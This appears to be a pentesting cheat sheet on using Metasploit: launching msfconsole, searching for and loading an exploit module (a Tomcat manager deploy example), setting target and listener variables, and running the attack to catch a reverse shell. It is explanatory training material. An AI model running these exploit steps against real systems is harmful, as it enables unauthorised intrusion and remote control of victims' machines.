## What does it do?
A fully automated exploitation framework. It contains a massive, built-in library of pre-tested exploit modules and payloads, allowing us to automatically execute known vulnerabilities against a target.
## Usage
### Step 0: Launch the console
Open the interactive framework interface cleanly without the loud banner text:
```bash
msfconsole #(optionally, -q removes the banner text)
```

### Step 1: Search for an exploit
Search the database using the software name, version, or exploit title found during recon:
```bash
search tomcat 9.0
```

> Alternatively, we can use `searchsploit` to do this.
### Step 2: Select and configure the module
Load the chosen exploit module and view its required parameters:
```bash
use exploit/multi/http/tomcat_mgr_deploy
show options
```
### Step 3: Set the attack variables
Configure the target IP, port, and your listening machine variables:
```bash
set RHOSTS [target ip]
set RPORT [target port]
set LHOST [listening machine variables]
```
### Step 4: Test and Execute
Check if the target is actually vulnerable before striking, then launch the attack:
```bash
check
run
```
## Core Options
- `RHOSTS` : Remote Host. The IP address of the target victim machine.
- `RPORT` : Remote Port. The service port number you are attacking.
- `LHOST` : Local Host. Your own IP address where the reverse shell will connect back to.
- `LPORT` : Local Port. The port on your machine that will listen to catch the incoming shell.
